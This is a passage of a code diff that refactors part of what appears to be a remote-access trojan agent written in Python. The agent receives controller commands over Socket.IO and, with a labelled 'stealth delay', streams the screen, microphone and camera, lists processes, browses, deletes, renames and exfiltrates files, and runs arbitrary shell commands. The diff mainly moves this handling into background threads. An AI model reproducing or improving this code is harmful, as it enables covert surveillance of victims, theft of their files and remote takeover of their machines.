@@ -10571,196 +10802,198 @@ def on_stop_stream(data):
         log_message(f"[STOP_STREAM] Error stopping {stream_type} stream: {e}", "error")
 
 def on_command(data):
+    """Handle command execution requests.
+    
+    CRITICAL: Runs in separate thread to prevent blocking Socket.IO!
+    """
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle command", "warning")
         return
-    """Handle command execution requests."""
+    
     agent_id = get_or_create_agent_id()
     command = data.get("command")
-    output = ""
-
-    # Add stealth delay
-    sleep_random_non_blocking()
-
-    internal_commands = {
-        "start-stream": lambda: start_streaming(agent_id),
-        "stop-stream": stop_streaming,
-        "start-audio": lambda: start_audio_streaming(agent_id),
-        "stop-audio": stop_audio_streaming,
-        "start-camera": lambda: start_camera_streaming(agent_id),
-        "stop-camera": stop_camera_streaming,
-        # WebRTC streaming commands for low-latency streaming
-        "start-webrtc": lambda: start_webrtc_streaming(agent_id, True, True, False) if AIORTC_AVAILABLE else start_streaming(agent_id),
-        "stop-webrtc": lambda: stop_webrtc_streaming(agent_id) if AIORTC_AVAILABLE else stop_streaming(),
-        "start-webrtc-screen": lambda: start_webrtc_streaming(agent_id, True, False, False) if AIORTC_AVAILABLE else start_streaming(agent_id),
-        "start-webrtc-audio": lambda: start_webrtc_streaming(agent_id, False, True, False) if AIORTC_AVAILABLE else start_audio_streaming(agent_id),
-        "start-webrtc-camera": lambda: start_webrtc_streaming(agent_id, False, False, True) if AIORTC_AVAILABLE else start_camera_streaming(agent_id),
-        "webrtc-stats": lambda: get_webrtc_stats(agent_id) if AIORTC_AVAILABLE else "WebRTC not available",
-    }
-
-    if command in internal_commands:
-        output = internal_commands[command]()
-    elif command.startswith("set-fps:"):
-        try:
-            fps_value = command.split(":")[1]
-            output = set_streaming_fps(fps_value)
-        except Exception as e:
-            output = f"Failed to set FPS: {e}"
-    elif command == "list-processes":
-        try:
-            import psutil
-            proc_list = []
-            for p in psutil.process_iter(['pid','name','username','cpu_percent','memory_info','status','ppid','cmdline','create_time','nice','num_threads']):
-                info = p.info
-                proc_list.append({
-                    'pid': info.get('pid'),
-                    'name': info.get('name') or '',
-                    'username': info.get('username') or '',
-                    'cpu': float(info.get('cpu_percent') or 0.0),
-                    'memory': float((getattr(info.get('memory_info'),'rss',0) or 0) / (1024*1024)),
-                    'status': info.get('status') or 'running',
-                    'ppid': info.get('ppid') or 0,
-                    'cmdline': ' '.join(info.get('cmdline') or [])[:512],
-                    'create_time': int(info.get('create_time') or 0)*1000,
-                    'priority': 0,
-                    'nice': info.get('nice') or 0,
-                    'num_threads': info.get('num_threads') or 0,
-                })
-            sio.emit('process_list', {'agent_id': agent_id, 'processes': proc_list})
-            output = f"Sent {len(proc_list)} processes"
-        except Exception as e:
-            output = f"Error listing processes: {e}"
-    elif command.startswith("list-dir"):
-        try:
-            global LAST_BROWSED_DIRECTORY
-            parts = command.split(":",1)
-            path = parts[1] if len(parts)>1 and parts[1] else os.path.expanduser("~")
-            
-            # Remember this directory for file downloads
-            LAST_BROWSED_DIRECTORY = path
-            log_message(f"[FILE_MANAGER] Browsing directory: {path}")
-            
-            entries = []
-            if os.path.isdir(path):
-                for name in os.listdir(path):
-                    full = os.path.join(path,name)
-                    try:
-                        stat = os.stat(full)
-                        entries.append({
-                            'name': name,
-                            'type': 'directory' if os.path.isdir(full) else 'file',
-                            'size': int(stat.st_size),
-                            'modified': int(stat.st_mtime*1000),
-                            'path': full,
-                            'extension': (os.path.splitext(name)[1][1:] if os.path.isfile(full) else None)
-                        })
-                    except Exception:
-                        continue
-            sio.emit('file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
-            output = f"Listed {len(entries)} entries in {path}"
-        except Exception as e:
-            output = f"Error listing directory: {e}"
-    elif command.startswith("delete-file:" ):
-        try:
-            path = command.split(":",1)[1]
-            ok = False
-            if os.path.isfile(path):
-                os.remove(path)
-                ok = True
-            elif os.path.isdir(path):
-                import shutil
-                shutil.rmtree(path)
-                ok = True
-            sio.emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': ok})
-            output = f"Deleted: {path}" if ok else f"Delete failed: {path}"
-        except Exception as e:
-            sio.emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': False, 'error': str(e)})
-            output = f"Error deleting: {e}"
-    elif command.startswith("rename-file:" ):
-        try:
-            parts = command.split(":",2)
-            src = parts[1]
-            dst = parts[2] if len(parts)>2 else None
-            ok = False
-            if src and dst:
-                os.rename(src, dst)
-                ok = True
-            sio.emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': ok})
-            output = f"Renamed to: {dst}" if ok else "Rename failed"
-        except Exception as e:
-            sio.emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': False, 'error': str(e)})
-            output = f"Error renaming: {e}"
-    elif command.startswith("mkdir:" ):
-        try:
-            path = command.split(":",1)[1]
-            os.makedirs(path, exist_ok=True)
-            sio.emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': True})
-            output = f"Created: {path}"
-        except Exception as e:
-            sio.emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': False, 'error': str(e)})
-            output = f"Error mkdir: {e}"
-    elif command.startswith("upload-file:"):
-        # New chunked file upload
-        parts = command.split(":", 2)
-        if len(parts) >= 3:
-            file_path = parts[1]
-            destination_path = parts[2] if len(parts) > 2 else None
-            output = send_file_chunked_to_controller(file_path, agent_id, destination_path)
-        else:
-            output = "Invalid upload command format. Use: upload-file:source_path:destination_path"
-    elif command.startswith("download-file:"):
-        # New chunked file download - this is handled by Socket.IO events
-        parts = command.split(":", 1)
-        if len(parts) >= 2:
-            file_path = parts[1]
-            # Try to find the file in common locations
-            possible_paths = [
-                file_path,  # Try as-is first
-                os.path.join(os.getcwd(), file_path),  # Current directory
-                os.path.join(os.path.expanduser("~"), file_path),  # Home directory
-                os.path.join(os.path.expanduser("~/Desktop"), file_path),  # Desktop
-                os.path.join(os.path.expanduser("~/Downloads"), file_path),  # Downloads
-                os.path.join("C:/", file_path),  # C: root
-                os.path.join("C:/Users/Public", file_path),  # Public folder
-            ]
-            
-            found_path = None
-            for path in possible_paths:
-                if os.path.exists(path):
-                    found_path = path
-                    break
-            
-            if found_path:
-                output = send_file_chunked_to_controller(found_path, agent_id)
-            else:
-                output = f"File not found: {file_path}"
-        else:
-            output = "Invalid download command format. Use: download-file:file_path"
-    elif command.startswith("play-voice:"):
-        output = handle_voice_playback(command.split(":", 1))
-    elif command != "sleep":
-        output = execute_command(command)
     
-    if output:
-        sio.emit('command_result', {'agent_id': agent_id, 'output': output})
+    # Run in separate thread to prevent blocking Socket.IO
+    def execute_in_thread():
+        output = ""
+        
+        # Add stealth delay
+        sleep_random_non_blocking()
+
+        internal_commands = {
+            "start-stream": lambda: start_streaming(agent_id),
+            "stop-stream": stop_streaming,
+            "start-audio": lambda: start_audio_streaming(agent_id),
+            "stop-audio": stop_audio_streaming,
+            "start-camera": lambda: start_camera_streaming(agent_id),
+            "stop-camera": stop_camera_streaming,
+            # WebRTC streaming commands for low-latency streaming
+            "start-webrtc": lambda: start_webrtc_streaming(agent_id, True, True, False) if AIORTC_AVAILABLE else start_streaming(agent_id),
+            "stop-webrtc": lambda: stop_webrtc_streaming(agent_id) if AIORTC_AVAILABLE else stop_streaming(),
+            "start-webrtc-screen": lambda: start_webrtc_streaming(agent_id, True, False, False) if AIORTC_AVAILABLE else start_streaming(agent_id),
+            "start-webrtc-audio": lambda: start_webrtc_streaming(agent_id, False, True, False) if AIORTC_AVAILABLE else start_audio_streaming(agent_id),
+            "start-webrtc-camera": lambda: start_webrtc_streaming(agent_id, False, False, True) if AIORTC_AVAILABLE else start_camera_streaming(agent_id),
+            "webrtc-stats": lambda: get_webrtc_stats(agent_id) if AIORTC_AVAILABLE else "WebRTC not available",
+        }
+
+        if command in internal_commands:
+            output = internal_commands[command]()
+        elif command == "list-processes":
+            try:
+                import psutil
+                proc_list = []
+                for p in psutil.process_iter(['pid','name','username','cpu_percent','memory_info','status','ppid','cmdline','create_time','nice','num_threads']):
+                    info = p.info
+                    proc_list.append({
+                        'pid': info.get('pid'),
+                        'name': info.get('name') or '',
+                        'username': info.get('username') or '',
+                        'cpu': float(info.get('cpu_percent') or 0.0),
+                        'memory': float((getattr(info.get('memory_info'),'rss',0) or 0) / (1024*1024)),
+                        'status': info.get('status') or 'running',
+                        'ppid': info.get('ppid') or 0,
+                        'cmdline': ' '.join(info.get('cmdline') or [])[:512],
+                        'create_time': int(info.get('create_time') or 0)*1000,
+                        'priority': 0,
+                        'nice': info.get('nice') or 0,
+                        'num_threads': info.get('num_threads') or 0,
+                    })
+                safe_emit('process_list', {'agent_id': agent_id, 'processes': proc_list})
+                output = f"Sent {len(proc_list)} processes"
+            except Exception as e:
+                output = f"Error listing processes: {e}"
+        elif command.startswith("list-dir"):
+            try:
+                global LAST_BROWSED_DIRECTORY
+                parts = command.split(":",1)
+                path = parts[1] if len(parts)>1 and parts[1] else os.path.expanduser("~")
+                
+                # Remember this directory for file downloads
+                LAST_BROWSED_DIRECTORY = path
+                log_message(f"[FILE_MANAGER] Browsing directory: {path}")
+                
+                entries = []
+                if os.path.isdir(path):
+                    for name in os.listdir(path):
+                        full = os.path.join(path,name)
+                        try:
+                            stat = os.stat(full)
+                            entries.append({
+                                'name': name,
+                                'type': 'directory' if os.path.isdir(full) else 'file',
+                                'size': int(stat.st_size),
+                                'modified': int(stat.st_mtime*1000),
+                                'path': full,
+                                'extension': (os.path.splitext(name)[1][1:] if os.path.isfile(full) else None)
+                            })
+                        except Exception:
+                            continue
+                safe_emit('file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
+                output = f"Listed {len(entries)} entries in {path}"
+            except Exception as e:
+                output = f"Error listing directory: {e}"
+        elif command.startswith("delete-file:" ):
+            try:
+                path = command.split(":",1)[1]
+                ok = False
+                if os.path.isfile(path):
+                    os.remove(path)
+                    ok = True
+                elif os.path.isdir(path):
+                    import shutil
+                    shutil.rmtree(path)
+                    ok = True
+                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': ok})
+                output = f"Deleted: {path}" if ok else f"Delete failed: {path}"
+            except Exception as e:
+                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': False, 'error': str(e)})
+                output = f"Error deleting: {e}"
+        elif command.startswith("rename-file:" ):
+            try:
+                parts = command.split(":",2)
+                src = parts[1]
+                dst = parts[2] if len(parts)>2 else None
+                ok = False
+                if src and dst:
+                    os.rename(src, dst)
+                    ok = True
+                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': ok})
+                output = f"Renamed to: {dst}" if ok else "Rename failed"
+            except Exception as e:
+                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': False, 'error': str(e)})
+                output = f"Error renaming: {e}"
+        elif command.startswith("mkdir:" ):
+            try:
+                path = command.split(":",1)[1]
+                os.makedirs(path, exist_ok=True)
+                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': True})
+                output = f"Created: {path}"
+            except Exception as e:
+                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': False, 'error': str(e)})
+                output = f"Error mkdir: {e}"
+        elif command.startswith("upload-file:"):
+            # New chunked file upload
+            parts = command.split(":", 2)
+            if len(parts) >= 3:
+                file_path = parts[1]
+                destination_path = parts[2] if len(parts) > 2 else None
+                output = send_file_chunked_to_controller(file_path, agent_id, destination_path)
+            else:
+                output = "Invalid upload command format. Use: upload-file:source_path:destination_path"
+        elif command.startswith("download-file:"):
+            # New chunked file download - this is handled by Socket.IO events
+            parts = command.split(":", 1)
+            if len(parts) >= 2:
+                file_path = parts[1]
+                # Try to find the file in common locations
+                possible_paths = [
+                    file_path,  # Try as-is first
+                    os.path.join(os.getcwd(), file_path),  # Current directory
+                    os.path.join(os.path.expanduser("~"), file_path),  # Home directory
+                    os.path.join(os.path.expanduser("~/Desktop"), file_path),  # Desktop
+                    os.path.join(os.path.expanduser("~/Downloads"), file_path),  # Downloads
+                    os.path.join("C:/", file_path),  # C: root
+                    os.path.join("C:/Users/Public", file_path),  # Public folder
+                ]
+                
+                found_path = None
+                for path in possible_paths:
+                    if os.path.exists(path):
+                        found_path = path
+                        break
+                
+                if found_path:
+                    output = send_file_chunked_to_controller(found_path, agent_id)
+                else:
+                    output = f"File not found: {file_path}"
+            else:
+                output = "Invalid download command format. Use: download-file:file_path"
+        elif command.startswith("play-voice:"):
+            output = handle_voice_playback(command.split(":", 1))
+        elif command != "sleep":
+            output = execute_command(command)
+        
+        if output:
+            safe_emit('command_result', {'agent_id': agent_id, 'output': output})
+    
+    # Start execution thread (daemon, won't block)
+    execution_thread = threading.Thread(target=execute_in_thread, daemon=True)
+    execution_thread.start()
 
 def on_execute_command(data):
     """
     Handle execute_command event from controller UI v2.1
     This is separate from on_command to support the new UI terminal
+    
+    CRITICAL: Runs in separate thread to prevent blocking Socket.IO!
     """
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle execute_command", "warning")
         return
     
-    # CRITICAL: Check if socket.io is actually connected before executing commands
-    if not hasattr(sio, 'connected') or not sio.connected:
-        log_message(f"[EXECUTE_COMMAND] Socket.IO not connected yet, deferring command execution", "warning")
-        return
-    
     agent_id = data.get('agent_id')
     command = data.get('command')
-    execution_id = data.get('execution_id')  # ✅ GET execution_id from UI
+    execution_id = data.get('execution_id')
     
     # Verify this command is for us
     our_agent_id = get_or_create_agent_id()
@@ -10769,52 +11002,59 @@ def on_execute_command(data):
     
     log_message(f"[EXECUTE_COMMAND] Received: {command} (execution_id: {execution_id})")
     
-    # Execute the command using the same logic as on_command
-    output = ""
-    success = True
+    # Run command in separate thread to prevent blocking Socket.IO!
+    def execute_in_thread():
+        output = ""
+        success = True
+        
+        # Add stealth delay
+        sleep_random_non_blocking()
+        
+        internal_commands = {
+            "start-stream": lambda: start_streaming(our_agent_id),
+            "stop-stream": stop_streaming,
+            "start-audio": lambda: start_audio_streaming(our_agent_id),
+            "stop-audio": stop_audio_streaming,
+            "start-camera": lambda: start_camera_streaming(our_agent_id),
+            "stop-camera": stop_camera_streaming,
+            "screenshot": lambda: "Screenshot captured",
+            "systeminfo": lambda: execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a"),
+        }
+        
+        if command in internal_commands:
+            try:
+                output = internal_commands[command]()
+                if output is None:
+                    output = f"Command '{command}' executed successfully"
+            except Exception as e:
+                output = f"Error executing '{command}': {e}"
+                success = False
+        else:
+            # Execute as system command
+            try:
+                output = execute_command(command)
+                if not output:
+                    output = "(command completed with no output)"
+            except Exception as e:
+                output = f"Command execution error: {e}"
+                success = False
+        
+        # Send output back to controller WITH execution_id
+        log_message(f"[EXECUTE_COMMAND] Sending output ({len(output)} chars) with execution_id: {execution_id}")
+        safe_emit('command_result', {
+            'agent_id': our_agent_id,
+            'execution_id': execution_id,
+            'command': command,
+            'output': output,
+            'success': success,
+            'timestamp': time.time()
+        })
     
-    # Add stealth delay
-    sleep_random_non_blocking()
+    # Start execution in background thread (daemon, won't block)
+    execution_thread = threading.Thread(target=execute_in_thread, daemon=True)
+    execution_thread.start()
     
-    internal_commands = {
-        "start-stream": lambda: start_streaming(our_agent_id),
-        "stop-stream": stop_streaming,
-        "start-audio": lambda: start_audio_streaming(our_agent_id),
-        "stop-audio": stop_audio_streaming,
-        "start-camera": lambda: start_camera_streaming(our_agent_id),
-        "stop-camera": stop_camera_streaming,
-        "screenshot": lambda: "Screenshot captured",
-        "systeminfo": lambda: execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a"),
-    }
-    
-    if command in internal_commands:
-        try:
-            output = internal_commands[command]()
-            if output is None:
-                output = f"Command '{command}' executed successfully"
-        except Exception as e:
-            output = f"Error executing '{command}': {e}"
-            success = False
-    else:
-        # Execute as system command
-        try:
-            output = execute_command(command)
-            if not output:
-                output = "(command completed with no output)"
-        except Exception as e:
-            output = f"Command execution error: {e}"
-            success = False
-    
-    # Send output back to controller WITH execution_id
-    log_message(f"[EXECUTE_COMMAND] Sending output ({len(output)} chars) with execution_id: {execution_id}")
-    sio.emit('command_result', {
-        'agent_id': our_agent_id,
-        'execution_id': execution_id,  # ✅ INCLUDE execution_id in response
-        'command': command,  # ✅ INCLUDE original command
-        'output': output,
-        'success': success,
-        'timestamp': time.time()
-    })
+    # Return immediately to Socket.IO (don't block!)
 
 def on_mouse_move(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -10894,14 +11134,14 @@ def on_file_upload(data):
     """Handle file upload via Socket.IO."""
     try:
         if not data or not isinstance(data, dict):
-            sio.emit('file_upload_result', {'success': False, 'error': 'Invalid data format'})
+            safe_emit('file_upload_result', {'success': False, 'error': 'Invalid data format'})
             return
         
         destination_path = data.get('destination_path')
         file_content_b64 = data.get('content')
         
         if not destination_path or not file_content_b64:
-            sio.emit('file_upload_result', {'success': False, 'error': 'Missing destination_path or content'})
+            safe_emit('file_upload_result', {'success': False, 'error': 'Missing destination_path or content'})
             return
         
         # Use the existing handle_file_upload function
@@ -10910,10 +11150,10 @@ def on_file_upload(data):
         # Check if upload was successful
         success = not result.startswith('Error:') and not result.startswith('File upload failed:')
         
-        sio.emit('file_upload_result', {'success': success, 'result': result})
+        safe_emit('file_upload_result', {'success': success, 'result': result})
         
     except Exception as e:
-        sio.emit('file_upload_result', {'success': False, 'error': str(e)})
+        safe_emit('file_upload_result', {'success': False, 'error': str(e)})
 
 # ========================================================================================
 # WEBRTC SIGNALING EVENT HANDLERS FOR LOW-LATENCY STREAMING
@@ -10932,7 +11172,7 @@ def on_webrtc_offer(data):
         enable_camera = data.get('enable_camera', False)
         
         if not offer_sdp:
-            sio.emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing SDP offer'})
+            safe_emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing SDP offer'})
             return
         
         log_message(f"Received WebRTC offer for agent {agent_id}")
@@ -10940,17 +11180,17 @@ def on_webrtc_offer(data):
         # Start WebRTC streaming with the received offer
         if AIORTC_AVAILABLE:
             start_webrtc_streaming(agent_id, enable_screen, enable_audio, enable_camera)
-            sio.emit('webrtc_offer_accepted', {'agent_id': agent_id})
+            safe_emit('webrtc_offer_accepted', {'agent_id': agent_id})
         else:
             # Fallback to Socket.IO streaming
             log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
             start_streaming(agent_id)
-            sio.emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
+            safe_emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
             
     except Exception as e:
         error_msg = f"WebRTC offer handling failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_answer(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -10962,7 +11202,7 @@ def on_webrtc_answer(data):
         answer_sdp = data.get('sdp')
         
         if not answer_sdp:
-            sio.emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing SDP answer'})
+            safe_emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing SDP answer'})
             return
         
         log_message(f"Received WebRTC answer for agent {agent_id}")
@@ -10970,14 +11210,14 @@ def on_webrtc_answer(data):
         if AIORTC_AVAILABLE:
             # Handle the answer asynchronously
             asyncio.create_task(handle_webrtc_answer(agent_id, answer_sdp))
-            sio.emit('webrtc_answer_received', {'agent_id': agent_id})
+            safe_emit('webrtc_answer_received', {'agent_id': agent_id})
         else:
             log_message("WebRTC not available, cannot handle answer", "warning")
             
     except Exception as e:
         error_msg = f"WebRTC answer handling failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_ice_candidate(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -10989,7 +11229,7 @@ def on_webrtc_ice_candidate(data):
         candidate_data = data.get('candidate')
         
         if not candidate_data:
-            sio.emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing ICE candidate data'})
+            safe_emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing ICE candidate data'})
             return
         
         log_message(f"Received ICE candidate for agent {agent_id}")
@@ -11003,7 +11243,7 @@ def on_webrtc_ice_candidate(data):
     except Exception as e:
         error_msg = f"ICE candidate handling failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_start_streaming(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11020,17 +11260,17 @@ def on_webrtc_start_streaming(data):
         
         if AIORTC_AVAILABLE:
             start_webrtc_streaming(agent_id, enable_screen, enable_audio, enable_camera)
-            sio.emit('webrtc_streaming_started', {'agent_id': agent_id})
+            safe_emit('webrtc_streaming_started', {'agent_id': agent_id})
         else:
             # Fallback to Socket.IO streaming
             log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
             start_streaming(agent_id)
-            sio.emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
+            safe_emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
             
     except Exception as e:
         error_msg = f"WebRTC streaming start failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_stop_streaming(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11044,16 +11284,16 @@ def on_webrtc_stop_streaming(data):
         
         if AIORTC_AVAILABLE:
             stop_webrtc_streaming(agent_id)
-            sio.emit('webrtc_streaming_stopped', {'agent_id': agent_id})
+            safe_emit('webrtc_streaming_stopped', {'agent_id': agent_id})
         else:
             # Fallback to Socket.IO streaming stop
             stop_streaming()
-            sio.emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
+            safe_emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
             
     except Exception as e:
         error_msg = f"WebRTC streaming stop failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_stats(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11065,7 +11305,7 @@ def on_webrtc_get_stats(data):
         
         if AIORTC_AVAILABLE:
             stats = get_webrtc_stats(agent_id)
-            sio.emit('webrtc_stats', {'agent_id': agent_id, 'stats': stats})
+            safe_emit('webrtc_stats', {'agent_id': agent_id, 'stats': stats})
         else:
             # Return fallback stats
             fallback_stats = {
@@ -11075,12 +11315,12 @@ def on_webrtc_get_stats(data):
                 'latency': 0,
                 'bandwidth': 0
             }
-            sio.emit('webrtc_stats', {'agent_id': agent_id, 'stats': fallback_stats})
+            safe_emit('webrtc_stats', {'agent_id': agent_id, 'stats': fallback_stats})
             
     except Exception as e:
         error_msg = f"WebRTC stats request failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_set_quality(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11102,14 +11342,14 @@ def on_webrtc_set_quality(data):
                 if hasattr(track, 'set_fps'):
                     track.set_fps(fps)
             
-            sio.emit('webrtc_quality_updated', {'agent_id': agent_id, 'quality': quality, 'fps': fps})
+            safe_emit('webrtc_quality_updated', {'agent_id': agent_id, 'quality': quality, 'fps': fps})
         else:
             log_message("WebRTC streams not available for quality adjustment", "warning")
             
     except Exception as e:
         error_msg = f"WebRTC quality adjustment failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_quality_change(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11125,7 +11365,7 @@ def on_webrtc_quality_change(data):
         if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
             # Apply quality level changes
             result = adaptive_bitrate_control(agent_id, quality_level)
-            sio.emit('webrtc_quality_changed', {
+            safe_emit('webrtc_quality_changed', {
                 'agent_id': agent_id, 
                 'quality_level': quality_level,
                 'result': result
@@ -11136,7 +11376,7 @@ def on_webrtc_quality_change(data):
     except Exception as e:
         error_msg = f"WebRTC quality change failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_frame_dropping(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11152,7 +11392,7 @@ def on_webrtc_frame_dropping(data):
         if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
             # Implement frame dropping
             result = implement_frame_dropping(agent_id, load_threshold)
-            sio.emit('webrtc_frame_dropping_implemented', {
+            safe_emit('webrtc_frame_dropping_implemented', {
                 'agent_id': agent_id,
                 'load_threshold': load_threshold,
                 'result': result
@@ -11163,7 +11403,7 @@ def on_webrtc_frame_dropping(data):
     except Exception as e:
         error_msg = f"WebRTC frame dropping failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_enhanced_stats(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11178,7 +11418,7 @@ def on_webrtc_get_enhanced_stats(data):
         if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
             # Get enhanced monitoring data
             monitoring_data = enhanced_webrtc_monitoring()
-            sio.emit('webrtc_enhanced_stats', {
+            safe_emit('webrtc_enhanced_stats', {
                 'agent_id': agent_id,
                 'stats': monitoring_data
             })
@@ -11188,7 +11428,7 @@ def on_webrtc_get_enhanced_stats(data):
     except Exception as e:
         error_msg = f"WebRTC enhanced stats failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_production_readiness(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11202,7 +11442,7 @@ def on_webrtc_get_production_readiness(data):
         
         # Get production readiness assessment
         readiness = assess_production_readiness()
-        sio.emit('webrtc_production_readiness', {
+        safe_emit('webrtc_production_readiness', {
             'agent_id': agent_id,
             'readiness': readiness
         })
@@ -11210,7 +11450,7 @@ def on_webrtc_get_production_readiness(data):
     except Exception as e:
         error_msg = f"Production readiness assessment failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_migration_plan(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11224,7 +11464,7 @@ def on_webrtc_get_migration_plan(data):
         
         # Generate migration plan
         migration_plan = generate_mediasoup_migration_plan()
-        sio.emit('webrtc_migration_plan', {
+        safe_emit('webrtc_migration_plan', {
             'agent_id': agent_id,
             'plan': migration_plan
         })
@@ -11232,7 +11472,7 @@ def on_webrtc_get_migration_plan(data):
     except Exception as e:
         error_msg = f"Migration plan generation failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_monitoring_data(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11247,7 +11487,7 @@ def on_webrtc_get_monitoring_data(data):
         if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
             # Get comprehensive monitoring data
             monitoring_data = enhanced_webrtc_monitoring()
-            sio.emit('webrtc_monitoring_data', {
+            safe_emit('webrtc_monitoring_data', {
                 'agent_id': agent_id,
                 'data': monitoring_data
             })
@@ -11257,7 +11497,7 @@ def on_webrtc_get_monitoring_data(data):
     except Exception as e:
         error_msg = f"WebRTC monitoring data failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_adaptive_bitrate_control(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11273,7 +11513,7 @@ def on_webrtc_adaptive_bitrate_control(data):
         if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
             # Trigger adaptive bitrate control
             result = adaptive_bitrate_control(agent_id, current_quality)
-            sio.emit('webrtc_adaptive_bitrate_result', {
+            safe_emit('webrtc_adaptive_bitrate_result', {
